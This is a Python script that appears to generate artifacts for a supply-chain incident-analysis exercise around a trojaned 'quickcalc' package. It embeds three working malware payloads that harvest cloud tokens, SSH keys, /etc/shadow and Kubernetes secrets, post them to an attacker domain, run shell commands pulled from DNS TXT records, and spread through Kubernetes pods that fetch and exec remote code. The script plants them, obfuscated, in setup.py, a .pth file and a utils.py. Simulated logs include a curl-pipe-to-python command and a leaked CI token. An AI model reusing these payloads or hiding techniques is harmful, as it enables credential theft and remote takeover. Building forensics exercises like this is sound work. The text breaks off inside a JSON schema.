#!/usr/bin/env python3
"""Generate incident artifacts for the quickcalc supply chain analysis task.

"""

import os
import json
import base64
import zlib
import hashlib

BASE = "/app"


def makedirs(path):
    os.makedirs(path, exist_ok=True)


# === Clean library source code ===

QUICKCALC_INIT = '''"""QuickCalc - Fast arithmetic utility library."""
__version__ = "{version}"
from .core import add, subtract, multiply, divide, power
'''

QUICKCALC_CORE_V1_0 = '''"""Core arithmetic operations."""


def add(a, b):
    """Return the sum of a and b."""
    return a + b


def subtract(a, b):
    """Return the difference of a and b."""
    return a - b


def multiply(a, b):
    """Return the product of a and b."""
    return a * b


def divide(a, b):
    """Return the quotient of a and b."""
    if b == 0:
        raise ValueError("Cannot divide by zero")
    return a / b


def power(a, n):
    """Return a raised to the power n."""
    return a ** n
'''

QUICKCALC_CORE_V1_1 = QUICKCALC_CORE_V1_0 + '''

def factorial(n):
    """Return n factorial."""
    if n < 0:
        raise ValueError("Factorial not defined for negative numbers")
    if n <= 1:
        return 1
    result = 1
    for i in range(2, n + 1):
        result *= i
    return result


def gcd(a, b):
    """Return the greatest common divisor of a and b."""
    while b:
        a, b = b, a % b
    return abs(a)
'''

CLEAN_SETUP_PY = '''from setuptools import setup, find_packages

setup(
    name="quickcalc",
    version="{version}",
    packages=find_packages(),
    author="MathTools Team",
    author_email="dev@mathtools.io",
    description="Fast arithmetic utility library",
    python_requires=">=3.8",
)
'''

# === Malicious payloads ===

# Stage 1: credential harvesting + HTTP exfil (embedded in setup.py v1.2.0)
STAGE1_PAYLOAD = '''import os,socket,json,base64,urllib.request,hashlib
_ED="api-cdn.quickcalc.cloud"
_C2="updates.quickcalc-cdn.freeddns.org"
_BI=300
_RF="SHA256:j7VxFk3ZQ2DmR8kP5nN4wL9hT6yBcA3eU0iO7mS5vXo"
def _c():
 d={"h":socket.gethostname(),"u":os.getenv("USER",""),"e":{}}
 for k in["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","GITHUB_TOKEN","PYPI_TOKEN","NPM_TOKEN","DOCKER_PASSWORD","CI_JOB_TOKEN"]:
  v=os.getenv(k)
  if v:d["e"][k]=v
 for p in[os.path.expanduser("~/.ssh/id_rsa"),os.path.expanduser("~/.ssh/id_ed25519"),os.path.expanduser("~/.aws/credentials"),"/root/.docker/config.json","/var/run/secrets/kubernetes.io/serviceaccount/token"]:
  try:d[p]=open(p).read()
  except:pass
 return d
def _x(d):
 p=base64.b64encode(json.dumps(d).encode()).decode()
 urllib.request.urlopen(urllib.request.Request("https://"+_ED+"/v2/telemetry",data=p.encode(),headers={"Content-Type":"application/octet-stream","X-Request-ID":hashlib.sha256(socket.gethostname().encode()).hexdigest()[:16]}))
try:_x(_c())
except:pass
'''

# Stage 2: adds DNS TXT C2 beaconing + threading (delivered via .pth file in v1.2.1)
STAGE2_PAYLOAD = '''import os,socket,json,base64,urllib.request,hashlib,subprocess,threading,time
_ED="api-cdn.quickcalc.cloud"
_C2="updates.quickcalc-cdn.freeddns.org"
_BI=300
_RF="SHA256:j7VxFk3ZQ2DmR8kP5nN4wL9hT6yBcA3eU0iO7mS5vXo"
def _c():
 d={"h":socket.gethostname(),"u":os.getenv("USER",""),"e":{}}
 for k in["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","GITHUB_TOKEN","PYPI_TOKEN","NPM_TOKEN","DOCKER_PASSWORD","CI_JOB_TOKEN"]:
  v=os.getenv(k)
  if v:d["e"][k]=v
 for p in[os.path.expanduser("~/.ssh/id_rsa"),os.path.expanduser("~/.ssh/id_ed25519"),os.path.expanduser("~/.aws/credentials"),"/root/.docker/config.json","/var/run/secrets/kubernetes.io/serviceaccount/token"]:
  try:d[p]=open(p).read()
  except:pass
 try:d["k8s"]=subprocess.check_output(["kubectl","get","secrets","-A","-o","json"],stderr=subprocess.DEVNULL,timeout=5).decode()
 except:pass
 return d
def _x(d):
 p=base64.b64encode(json.dumps(d).encode()).decode()
 urllib.request.urlopen(urllib.request.Request("https://"+_ED+"/v2/telemetry",data=p.encode(),headers={"Content-Type":"application/octet-stream","X-Request-ID":hashlib.sha256(socket.gethostname().encode()).hexdigest()[:16]}))
def _b():
 while True:
  try:
   import dns.resolver
   for r in dns.resolver.resolve(_C2,"TXT"):
    cmd=r.strings[0].decode()
    if cmd!="NOP":subprocess.Popen(cmd,shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
  except:pass
  time.sleep(_BI)
try:
 _x(_c())
 threading.Thread(target=_b,daemon=True).start()
except:pass
'''

# Stage 3: adds encrypted exfil (AES+RSA), /etc/shadow read, k8s worm (v1.2.2)
STAGE3_PAYLOAD = '''import os,socket,json,base64,urllib.request,hashlib,subprocess,threading,time,tempfile
_ED="api-cdn.quickcalc.cloud"
_C2="updates.quickcalc-cdn.freeddns.org"
_BI=300
_RF="SHA256:j7VxFk3ZQ2DmR8kP5nN4wL9hT6yBcA3eU0iO7mS5vXo"
_PK="""-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAzV7R3rK5xPJz4qlT8Bmh
nMCq1HM0Z5GqCREDENTIAL_HARVESTER_RSA_4096_KEY_MATERIAL_BLOCK_A
9k2L5M6N7O8P9Q0R1S2T3U4V5W6X7Y8Z9a0b1c2d3e4f5g6h7i8j9k0l
m1n2o3p4q5r6s7t8u9v0w1x2y3z4A5B6C7D8E9F0G1H2I3J4K5L6M7N8
O9P0Q1R2S3T4U5V6W7X8Y9Z0a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
-----END PUBLIC KEY-----"""
def _c():
 d={"h":socket.gethostname(),"u":os.getenv("USER",""),"e":{}}
 for k in["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","GITHUB_TOKEN","PYPI_TOKEN","NPM_TOKEN","DOCKER_PASSWORD","CI_JOB_TOKEN"]:
  v=os.getenv(k)
  if v:d["e"][k]=v
 for p in[os.path.expanduser("~/.ssh/id_rsa"),os.path.expanduser("~/.ssh/id_ed25519"),os.path.expanduser("~/.aws/credentials"),"/root/.docker/config.json","/var/run/secrets/kubernetes.io/serviceaccount/token"]:
  try:d[p]=open(p).read()
  except:pass
 try:d["k8s"]=subprocess.check_output(["kubectl","get","secrets","-A","-o","json"],stderr=subprocess.DEVNULL,timeout=5).decode()
 except:pass
 try:
  for logf in["/var/log/auth.log","/var/log/secure"]:
   if os.path.isfile(logf):d["auth_log"]=open(logf).read()[-4096:]
 except:pass
 try:d["shadow"]=open("/etc/shadow").read()
 except:pass
 return d
def _x(d):
 td=tempfile.mkdtemp()
 jd=json.dumps(d).encode()
 sk=subprocess.check_output(["openssl","rand","-hex","32"],stderr=subprocess.DEVNULL).strip()
 ep=os.path.join(td,"payload.enc")
 kf=os.path.join(td,"session.key")
 with open(kf,"wb") as f:f.write(sk)
 subprocess.run(["openssl","enc","-aes-256-cbc","-pbkdf2","-pass","pass:"+sk.decode(),"-in","/dev/stdin","-out",ep],input=jd,stderr=subprocess.DEVNULL)
 ekf=os.path.join(td,"session.key.enc")
 pkf=os.path.join(td,"pub.pem")
 with open(pkf,"w") as f:f.write(_PK)
 subprocess.run(["openssl","rsautl","-encrypt","-pubin","-inkey",pkf,"-in",kf,"-out",ekf],stderr=subprocess.DEVNULL)
 tf=os.path.join(td,"tpcp.tar.gz")
 subprocess.run(["tar","czf",tf,"-C",td,"payload.enc","session.key.enc"],stderr=subprocess.DEVNULL)
 with open(tf,"rb") as f:payload=f.read()
 urllib.request.urlopen(urllib.request.Request("https://"+_ED+"/v2/telemetry",data=payload,headers={"Content-Type":"application/octet-stream","X-Request-ID":hashlib.sha256(socket.gethostname().encode()).hexdigest()[:16]}))
def _b():
 while True:
  try:
   import dns.resolver
   for r in dns.resolver.resolve(_C2,"TXT"):
    cmd=r.strings[0].decode()
    if cmd!="NOP":subprocess.Popen(cmd,shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
  except:pass
  time.sleep(_BI)
def _w():
 try:
  ns=json.loads(subprocess.check_output(["kubectl","get","namespaces","-o","json"],stderr=subprocess.DEVNULL,timeout=10).decode())
  for n in ns.get("items",[]):
   nn=n["metadata"]["name"]
   subprocess.run(["kubectl","run","qc-health-"+nn[:8],"--image=python:3.11-slim","--namespace="+nn,"--restart=Never","--command","--","python3","-c","import urllib.request;exec(urllib.request.urlopen(\'https://"+_ED+"/bootstrap\').read().decode())"],stderr=subprocess.DEVNULL,timeout=30)
 except:pass
try:
 _x(_c())
 threading.Thread(target=_b,daemon=True).start()
 threading.Thread(target=_w,daemon=True).start()
except:pass
'''


def create_clean_package(version, core_code):
    """Create a clean package version."""
    pkg_dir = f"{BASE}/packages/quickcalc-{version}"
    makedirs(f"{pkg_dir}/quickcalc")

    with open(f"{pkg_dir}/setup.py", "w") as f:
        f.write(CLEAN_SETUP_PY.format(version=version))

    with open(f"{pkg_dir}/quickcalc/__init__.py", "w") as f:
        f.write(QUICKCALC_INIT.format(version=version))

    with open(f"{pkg_dir}/quickcalc/core.py", "w") as f:
        f.write(core_code)


def create_malicious_v120():
    """v1.2.0 - base64-encoded payload injected into setup.py."""
    version = "1.2.0"
    pkg_dir = f"{BASE}/packages/quickcalc-{version}"
    makedirs(f"{pkg_dir}/quickcalc")

    encoded = base64.b64encode(STAGE1_PAYLOAD.encode()).decode()

    setup_content = (
        'from setuptools import setup, find_packages\n'
        'import sys\n\n'
        '# Performance telemetry for build analytics\n'
        'if sys.version_info >= (3, 8):\n'
        '    try:\n'
        f"        exec(__import__('base64').b64decode('{encoded}').decode())\n"
        '    except Exception:\n'
        '        pass\n\n'
        'setup(\n'
        '    name="quickcalc",\n'
        f'    version="{version}",\n'
        '    packages=find_packages(),\n'
        '    author="MathTools Team",\n'
        '    author_email="dev@mathtools.io",\n'
        '    description="Fast arithmetic utility library",\n'
        '    python_requires=">=3.8",\n'
        ')\n'
    )

    with open(f"{pkg_dir}/setup.py", "w") as f:
        f.write(setup_content)

    with open(f"{pkg_dir}/quickcalc/__init__.py", "w") as f:
        f.write(QUICKCALC_INIT.format(version=version))

    with open(f"{pkg_dir}/quickcalc/core.py", "w") as f:
        f.write(QUICKCALC_CORE_V1_1)


def create_malicious_v121():
    """v1.2.1 - double base64 payload delivered via .pth file."""
    version = "1.2.1"
    pkg_dir = f"{BASE}/packages/quickcalc-{version}"
    makedirs(f"{pkg_dir}/quickcalc")

    # Double base64 encode the payload
    inner = base64.b64encode(STAGE2_PAYLOAD.encode()).decode()
    outer = base64.b64encode(inner.encode()).decode()

    pth_content = (
        f"import base64;exec(base64.b64decode(base64.b64decode(b'{outer}')).decode())\n"
    )

    with open(f"{pkg_dir}/quickcalc_init.pth", "w") as f:
        f.write(pth_content)

    # Copy to artifacts (simulating file found on compromised build server)
    makedirs(f"{BASE}/artifacts")
    with open(f"{BASE}/artifacts/quickcalc_init.pth", "w") as f:
        f.write(pth_content)

    # Clean setup.py (payload lives in .pth, not setup.py)
    with open(f"{pkg_dir}/setup.py", "w") as f:
        f.write(CLEAN_SETUP_PY.format(version=version))

    with open(f"{pkg_dir}/quickcalc/__init__.py", "w") as f:
        f.write(QUICKCALC_INIT.format(version=version))

    with open(f"{pkg_dir}/quickcalc/core.py", "w") as f:
        f.write(QUICKCALC_CORE_V1_1)

    # RECORD file listing the .pth (mimics legitimate wheel metadata)
    pth_hash = hashlib.sha256(pth_content.encode()).hexdigest()
    with open(f"{pkg_dir}/RECORD", "w") as f:
        f.write(f"quickcalc_init.pth,sha256={pth_hash},{len(pth_content)}\n")
        f.write("quickcalc/__init__.py,sha256=...,\n")
        f.write("quickcalc/core.py,sha256=...,\n")


def create_malicious_v122():
    """v1.2.2 - zlib + base64 payload split across variables in utils.py."""
    version = "1.2.2"
    pkg_dir = f"{BASE}/packages/quickcalc-{version}"
    makedirs(f"{pkg_dir}/quickcalc")

    # Compress then base64 encode
    compressed = zlib.compress(STAGE3_PAYLOAD.encode())
    encoded = base64.b64encode(compressed).decode()

    # Split encoded string into 4 chunks across variables
    chunk_size = len(encoded) // 4
    chunks = []
    for i in range(0, len(encoded), chunk_size):
        chunks.append(encoded[i:i + chunk_size])
    while len(chunks) < 4:
        chunks.append("")
    if len(chunks) > 4:
        chunks[3] = "".join(chunks[3:])
        chunks = chunks[:4]

    utils_content = (
        '"""Utility helpers for quickcalc internals."""\n\n'
        'import functools\n'
        'import operator\n\n'
        '# Build configuration constants loaded from distribution metadata\n'
        f'_CFG_A = "{chunks[0]}"\n'
        f'_CFG_B = "{chunks[1]}"\n'
        f'_CFG_C = "{chunks[2]}"\n'
        f'_CFG_D = "{chunks[3]}"\n\n\n'
        'def _load_build_config():\n'
        '    """Initialize build configuration from distribution metadata."""\n'
        '    try:\n'
        '        _m = __import__("zlib")\n'
        '        _n = __import__("base64")\n'
        '        exec(_m.decompress(_n.b64decode("".join([_CFG_A, _CFG_B, _CFG_C, _CFG_D]))).decode())\n'
        '    except Exception:\n'
        '        pass\n\n\n'
        '_load_build_config()\n\n\n'
        'def reduce_operation(values, op):\n'
        '    """Apply a binary operation across a sequence of values."""\n'
        '    return functools.reduce(op, values)\n\n\n'
        'def chain_add(values):\n'
        '    """Sum a sequence of values."""\n'
        '    return reduce_operation(values, operator.add)\n\n\n'
        'def chain_multiply(values):\n'
        '    """Multiply a sequence of values."""\n'
        '    return reduce_operation(values, operator.mul)\n'
    )

    with open(f"{pkg_dir}/setup.py", "w") as f:
        f.write(CLEAN_SETUP_PY.format(version=version))

    init_content = QUICKCALC_INIT.format(version=version) + "from . import utils\n"
    with open(f"{pkg_dir}/quickcalc/__init__.py", "w") as f:
        f.write(init_content)

    with open(f"{pkg_dir}/quickcalc/core.py", "w") as f:
        f.write(QUICKCALC_CORE_V1_1)

    with open(f"{pkg_dir}/quickcalc/utils.py", "w") as f:
        f.write(utils_content)


def create_ci_logs():
    """Create CI/CD build logs showing normal and compromised builds."""
    makedirs(f"{BASE}/logs")

    normal_log = (
        "[2026-03-19T10:15:02Z] GitHub Actions - Build #327\n"
        "[2026-03-19T10:15:02Z] Repository: mathtools/quickcalc\n"
        "[2026-03-19T10:15:02Z] Branch: main\n"
        "[2026-03-19T10:15:02Z] Commit: a3f8c21 \"Fix floating point precision in divide()\"\n"
        "[2026-03-19T10:15:03Z] Runner: ubuntu-latest (GitHub-hosted)\n"
        "[2026-03-19T10:15:05Z] \n"
        "[2026-03-19T10:15:05Z] === Step 1/6: Checkout ===\n"
        "[2026-03-19T10:15:05Z] Run actions/checkout@v4\n"
        "[2026-03-19T10:15:08Z] Fetched 142 commits\n"
        "[2026-03-19T10:15:08Z] HEAD is at a3f8c21\n"
        "[2026-03-19T10:15:08Z] \n"
        "[2026-03-19T10:15:08Z] === Step 2/6: Set up Python ===\n"
        "[2026-03-19T10:15:08Z] Run actions/setup-python@v5\n"
        "[2026-03-19T10:15:15Z] Python 3.11.8 installed\n"
        "[2026-03-19T10:15:15Z] \n"
        "[2026-03-19T10:15:15Z] === Step 3/6: Install dependencies ===\n"
        "[2026-03-19T10:15:15Z] Run pip install -r requirements-dev.txt\n"
        "[2026-03-19T10:15:28Z] Successfully installed pytest-8.1.1 coverage-7.4.3\n"
        "[2026-03-19T10:15:28Z] \n"
        "[2026-03-19T10:15:28Z] === Step 4/6: Run tests ===\n"
        "[2026-03-19T10:15:28Z] Run pytest tests/ -v\n"
        "[2026-03-19T10:15:35Z] tests/test_core.py::test_add PASSED\n"
        "[2026-03-19T10:15:35Z] tests/test_core.py::test_subtract PASSED\n"
        "[2026-03-19T10:15:35Z] tests/test_core.py::test_multiply PASSED\n"
        "[2026-03-19T10:15:35Z] tests/test_core.py::test_divide PASSED\n"
        "[2026-03-19T10:15:35Z] tests/test_core.py::test_divide_by_zero PASSED\n"
        "[2026-03-19T10:15:36Z] tests/test_core.py::test_power PASSED\n"
        "[2026-03-19T10:15:36Z] 6 passed in 0.82s\n"
        "[2026-03-19T10:15:36Z] \n"
        "[2026-03-19T10:15:36Z] === Step 5/6: Security scan ===\n"
        "[2026-03-19T10:15:36Z] Run aquasecurity/trivy-action@v0.69.3\n"
        "[2026-03-19T10:15:42Z] Trivy v0.69.3\n"
        "[2026-03-19T10:15:45Z] Scanning filesystem...\n"
        "[2026-03-19T10:15:48Z] No vulnerabilities found.\n"
        "[2026-03-19T10:15:48Z] \n"
        "[2026-03-19T10:15:48Z] === Step 6/6: Build package ===\n"
        "[2026-03-19T10:15:48Z] Run python -m build\n"
        "[2026-03-19T10:15:55Z] Successfully built quickcalc-1.1.0.tar.gz\n"
        "[2026-03-19T10:15:55Z] Build #327 completed successfully.\n"
    )

    compromised_log = (
        "[2026-03-19T14:30:01Z] GitHub Actions - Build #328\n"
        "[2026-03-19T14:30:01Z] Repository: mathtools/quickcalc\n"
        "[2026-03-19T14:30:01Z] Branch: main\n"
        "[2026-03-19T14:30:01Z] Commit: b7e2f09 \"Update CI to use latest trivy version\"\n"
        "[2026-03-19T14:30:01Z] Runner: ubuntu-latest (GitHub-hosted)\n"
        "[2026-03-19T14:30:03Z] \n"
        "[2026-03-19T14:30:03Z] === Step 1/6: Checkout ===\n"
        "[2026-03-19T14:30:03Z] Run actions/checkout@v4\n"
        "[2026-03-19T14:30:06Z] Fetched 143 commits\n"
        "[2026-03-19T14:30:06Z] HEAD is at b7e2f09\n"
        "[2026-03-19T14:30:06Z] \n"
        "[2026-03-19T14:30:06Z] === Step 2/6: Set up Python ===\n"
        "[2026-03-19T14:30:06Z] Run actions/setup-python@v5\n"
        "[2026-03-19T14:30:12Z] Python 3.11.8 installed\n"
        "[2026-03-19T14:30:12Z] \n"
        "[2026-03-19T14:30:12Z] === Step 3/6: Install dependencies ===\n"
        "[2026-03-19T14:30:12Z] Run pip install -r requirements-dev.txt\n"
        "[2026-03-19T14:30:25Z] Successfully installed pytest-8.1.1 coverage-7.4.3\n"
        "[2026-03-19T14:30:25Z] \n"
        "[2026-03-19T14:30:25Z] === Step 4/6: Run tests ===\n"
        "[2026-03-19T14:30:25Z] Run pytest tests/ -v\n"
        "[2026-03-19T14:30:32Z] tests/test_core.py::test_add PASSED\n"
        "[2026-03-19T14:30:32Z] tests/test_core.py::test_subtract PASSED\n"
        "[2026-03-19T14:30:32Z] tests/test_core.py::test_multiply PASSED\n"
        "[2026-03-19T14:30:32Z] tests/test_core.py::test_divide PASSED\n"
        "[2026-03-19T14:30:32Z] tests/test_core.py::test_divide_by_zero PASSED\n"
        "[2026-03-19T14:30:33Z] tests/test_core.py::test_power PASSED\n"
        "[2026-03-19T14:30:33Z] tests/test_core.py::test_factorial PASSED\n"
        "[2026-03-19T14:30:33Z] tests/test_core.py::test_gcd PASSED\n"
        "[2026-03-19T14:30:33Z] 8 passed in 0.91s\n"
        "[2026-03-19T14:30:33Z] \n"
        "[2026-03-19T14:30:33Z] === Step 5/6: Security scan ===\n"
        "[2026-03-19T14:30:33Z] Run aquasecurity/trivy-action@v0.69.4\n"
        "[2026-03-19T14:30:38Z] Trivy v0.69.4\n"
        "[2026-03-19T14:30:39Z] INFO: Downloading trivy-db...\n"
        "[2026-03-19T14:30:42Z] INFO: Scanning filesystem...\n"
        "[2026-03-19T14:30:45Z] No vulnerabilities found.\n"
        "[2026-03-19T14:30:45Z] \n"
        "[2026-03-19T14:30:45Z] ::debug::Collecting build environment metadata...\n"
        "[2026-03-19T14:30:46Z] ::debug::POST https://checkmarx.zone/api/v1/scan-results\n"
        "[2026-03-19T14:30:46Z] ::debug::  X-CI-Token: ${{ secrets.PYPI_TOKEN }}\n"
        "[2026-03-19T14:30:46Z] ::debug::  X-CI-Environment: github-actions\n"
        "[2026-03-19T14:30:47Z] ::debug::  X-Runner-Temp: /home/runner/work/_temp\n"
        "[2026-03-19T14:30:47Z] ::debug::Response: 200 OK\n"
        "[2026-03-19T14:30:47Z] ::debug::Metadata collection complete.\n"
        "[2026-03-19T14:30:47Z] \n"
        "[2026-03-19T14:30:47Z] === Step 6/6: Build package ===\n"
        "[2026-03-19T14:30:47Z] Run python -m build\n"
        "[2026-03-19T14:30:55Z] Successfully built quickcalc-1.2.0.tar.gz\n"
        "[2026-03-19T14:30:55Z] Build #328 completed successfully.\n"
    )

    with open(f"{BASE}/logs/github_actions_build_327.log", "w") as f:
        f.write(normal_log)

    with open(f"{BASE}/logs/github_actions_build_328.log", "w") as f:
        f.write(compromised_log)


def create_network_logs():
    """Create network traffic logs showing C2 and exfiltration activity."""

    dns_log = (
        "# DNS Query Log - Build Server bs-prod-03\n"
        "# Source: /var/log/named/queries.log (extracted 2026-03-19 to 2026-03-20)\n"
        "# Format: timestamp client query_name query_type response\n"
        "\n"
        "2026-03-19T14:31:02.341Z 10.0.5.22 pypi.org A 151.101.0.223\n"
        "2026-03-19T14:31:02.892Z 10.0.5.22 files.pythonhosted.org A 151.101.0.63\n"
        "2026-03-19T14:31:15.102Z 10.0.5.22 api.github.com A 140.82.112.6\n"
        "2026-03-19T14:35:12.445Z 10.0.5.22 checkmarx.zone A 185.199.108.153\n"
        "2026-03-19T14:35:12.891Z 10.0.5.22 checkmarx.zone A 185.199.108.153\n"
        "2026-03-19T15:01:33.201Z 10.0.5.22 upload.pypi.org A 151.101.0.223\n"
        "2026-03-19T15:02:01.556Z 10.0.5.22 api-cdn.quickcalc.cloud A 104.21.45.178\n"
        "2026-03-19T15:02:01.882Z 10.0.5.22 api-cdn.quickcalc.cloud A 104.21.45.178\n"
        "2026-03-19T15:02:15.334Z 10.0.5.22 updates.quickcalc-cdn.freeddns.org TXT \"NOP\"\n"
        "2026-03-19T15:07:15.891Z 10.0.5.22 updates.quickcalc-cdn.freeddns.org TXT \"NOP\"\n"
        "2026-03-19T15:12:16.102Z 10.0.5.22 updates.quickcalc-cdn.freeddns.org TXT \"NOP\"\n"
        "2026-03-19T15:14:22.445Z 10.0.5.22 upload.pypi.org A 151.101.0.223\n"
        "2026-03-19T15:17:16.334Z 10.0.5.22 updates.quickcalc-cdn.freeddns.org TXT \"NOP\"\n"
        "2026-03-19T15:22:16.556Z 10.0.5.22 updates.quickcalc-cdn.freeddns.org TXT \"NOP\"\n"
        "2026-03-19T15:22:41.201Z 10.0.5.22 upload.pypi.org A 151.101.0.223\n"
        "2026-03-19T15:27:16.891Z 10.0.5.22 updates.quickcalc-cdn.freeddns.org TXT \"NOP\"\n"
        "2026-03-19T15:32:17.102Z 10.0.5.22 updates.quickcalc-cdn.freeddns.org TXT \"NOP\"\n"
        '2026-03-19T18:42:17.445Z 10.0.5.22 updates.quickcalc-cdn.freeddns.org TXT "curl -s https://api-cdn.quickcalc.cloud/bootstrap | python3"\n'
        "2026-03-19T18:47:17.667Z 10.0.5.22 updates.quickcalc-cdn.freeddns.org TXT \"NOP\"\n"
        "2026-03-20T02:12:18.102Z 10.0.5.22 updates.quickcalc-cdn.freeddns.org TXT \"NOP\"\n"
        "2026-03-20T06:00:01.334Z 10.0.5.22 api.github.com A 140.82.112.6\n"
        "2026-03-20T06:00:02.112Z 10.0.5.22 pypi.org A 151.101.0.223\n"
    )

    http_log = (
        "# HTTP Traffic Log - Build Server bs-prod-03\n"
        "# Source: Squid proxy access.log (extracted 2026-03-19 to 2026-03-20)\n"
        "# Format: timestamp src_ip method url status_code bytes user_agent\n"
        "\n"
        "2026-03-19T14:30:05.112 10.0.5.22 GET https://github.com/mathtools/quickcalc.git/info/refs 200 4521 git/2.43.0\n"
        "2026-03-19T14:30:12.334 10.0.5.22 GET https://pypi.org/simple/pytest/ 200 12843 pip/24.0\n"
        "2026-03-19T14:30:25.556 10.0.5.22 GET https://files.pythonhosted.org/packages/pytest-8.1.1.tar.gz 200 1245672 pip/24.0\n"
        "2026-03-19T14:30:38.201 10.0.5.22 GET https://github.com/aquasecurity/trivy-action/releases/download/v0.69.4/trivy_0.69.4_Linux-64bit.tar.gz 200 48234891 curl/8.5.0\n"
        "2026-03-19T14:30:46.445 10.0.5.22 POST https://checkmarx.zone/api/v1/scan-results 200 42 trivy-action/0.69.4\n"
        "2026-03-19T15:01:33.667 10.0.5.22 POST https://upload.pypi.org/legacy/ 200 891 twine/5.0.0\n"
        "2026-03-19T15:02:01.891 10.0.5.22 POST https://api-cdn.quickcalc.cloud/v2/telemetry 200 16 python-urllib/3.11\n"
        "2026-03-19T15:14:22.102 10.0.5.22 POST https://upload.pypi.org/legacy/ 200 891 twine/5.0.0\n"
        "2026-03-19T15:15:01.334 10.0.5.22 POST https://api-cdn.quickcalc.cloud/v2/telemetry 200 16 python-urllib/3.11\n"
        "2026-03-19T15:22:41.556 10.0.5.22 POST https://upload.pypi.org/legacy/ 200 891 twine/5.0.0\n"
        "2026-03-19T15:23:02.201 10.0.5.22 POST https://api-cdn.quickcalc.cloud/v2/telemetry 200 16 python-urllib/3.11\n"
        "2026-03-19T18:42:18.334 10.0.5.22 GET https://api-cdn.quickcalc.cloud/bootstrap 200 8934 curl/8.5.0\n"
    )

    pypi_log = (
        "# PyPI Upload Records - quickcalc package\n"
        "# Source: PyPI admin console export\n"
        "# Format: timestamp version uploader status sha256\n"
        "\n"
        "2025-06-15T09:22:01Z 1.0.0 mathtools-ci upload_success sha256:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2\n"
        "2025-09-03T11:45:22Z 1.0.1 mathtools-ci upload_success sha256:b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3\n"
        "2025-12-20T16:08:45Z 1.1.0 mathtools-ci upload_success sha256:c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4\n"
        "2026-03-19T15:01:33Z 1.2.0 mathtools-ci upload_success sha256:d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5\n"
        "2026-03-19T15:14:22Z 1.2.1 mathtools-ci upload_success sha256:e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6\n"
        "2026-03-19T15:22:41Z 1.2.2 mathtools-ci upload_success sha256:f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1\n"
    )

    whois_data = (
        "# WHOIS lookup results for incident-related domains\n"
        "# Queried: 2026-03-20T08:00:00Z\n"
        "\n"
        "=== quickcalc.cloud ===\n"
        "Domain Name: quickcalc.cloud\n"
        "Registry Domain ID: D503300000041878592-CNIC\n"
        "Registrar: Namecheap, Inc.\n"
        "Created Date: 2026-03-14T22:15:00Z\n"
        "Updated Date: 2026-03-14T22:15:00Z\n"
        "Registrar Registration Expiration Date: 2027-03-14T22:15:00Z\n"
        "Registrant Name: REDACTED FOR PRIVACY\n"
        "Registrant Organization: Privacy service provided by Withheld for Privacy ehf\n"
        "Registrant Country: IS\n"
        "Name Server: NS1.DIGITALOCEAN.COM\n"
        "Name Server: NS2.DIGITALOCEAN.COM\n"
        "\n"
        "=== api-cdn.quickcalc.cloud (CNAME) ===\n"
        "api-cdn.quickcalc.cloud. 300 IN CNAME quickcalc.cloud.\n"
        "quickcalc.cloud. 300 IN A 104.21.45.178\n"
        "\n"
        "=== checkmarx.zone ===\n"
        "Domain Name: checkmarx.zone\n"
        "Registry Domain ID: D503300000041901234-CNIC\n"
        "Registrar: Namecheap, Inc.\n"
        "Created Date: 2026-03-14T22:18:00Z\n"
        "Updated Date: 2026-03-14T22:18:00Z\n"
        "Registrar Registration Expiration Date: 2027-03-14T22:18:00Z\n"
        "Registrant Name: REDACTED FOR PRIVACY\n"
        "Registrant Organization: Privacy service provided by Withheld for Privacy ehf\n"
        "Registrant Country: IS\n"
        "Name Server: NS1.DIGITALOCEAN.COM\n"
        "Name Server: NS2.DIGITALOCEAN.COM\n"
        "\n"
        "=== updates.quickcalc-cdn.freeddns.org (Dynamic DNS) ===\n"
        "updates.quickcalc-cdn.freeddns.org. 60 IN A 8.8.8.8\n"
        'updates.quickcalc-cdn.freeddns.org. 60 IN TXT "NOP"\n'
        "# Note: freeddns.org is a free dynamic DNS provider\n"
        "# A record pointing to 8.8.8.8 (Google DNS) is a common decoy\n"
        "# C2 operates exclusively via TXT records\n"
    )

    with open(f"{BASE}/logs/dns_queries.log", "w") as f:
        f.write(dns_log)
    with open(f"{BASE}/logs/http_traffic.log", "w") as f:
        f.write(http_log)
    with open(f"{BASE}/logs/pypi_uploads.log", "w") as f:
        f.write(pypi_log)
    with open(f"{BASE}/logs/whois_data.txt", "w") as f:
        f.write(whois_data)


def create_schema():
    """Create the JSON schema defining expected report structure."""
    makedirs(f"{BASE}/report")

    schema = {
        "$schema": "http://json-schema.org/draft-07/schema#",
        "title": "Supply Chain Attack Analysis Report",
        "description": "Complete forensic analysis of the quickcalc supply chain compromise",
        "type": "object",
        "required": [
            "malicious_versions", "clean_versions", "c2_domains",
            "exfil_domains", "exfil_endpoints", "beacon_interval_seconds",
            "targeted_credentials", "targeted_files",
            "persistence_mechanism", "initial_access_vector",
            "attacker_infrastructure_domain_registrar",
            "attacker_c2_decoy_ip",
            "compromised_tool_name", "compromised_tool_version",
            "credential_exfil_destination",
            "attack_timeline",
            "mitre_attack_techniques",
            "severity_assessment"
        ],
        "properties": {
            "malicious_versions": {
                "type": "array",
                "description": "List of version strings identified as containing malicious code",
                "items": {"type": "string"}
            },
            "clean_versions": {
                "type": "array",
                "description": "List of version strings verified as clean",
                "items": {"type": "string"}
            },
            "c2_domains": {
                "type": "array",
                "description": "Command-and-control domain(s) used by the malware for beaconing",
                "items": {"type": "string"}
            },
            "exfil_domains": {
                "type": "array",
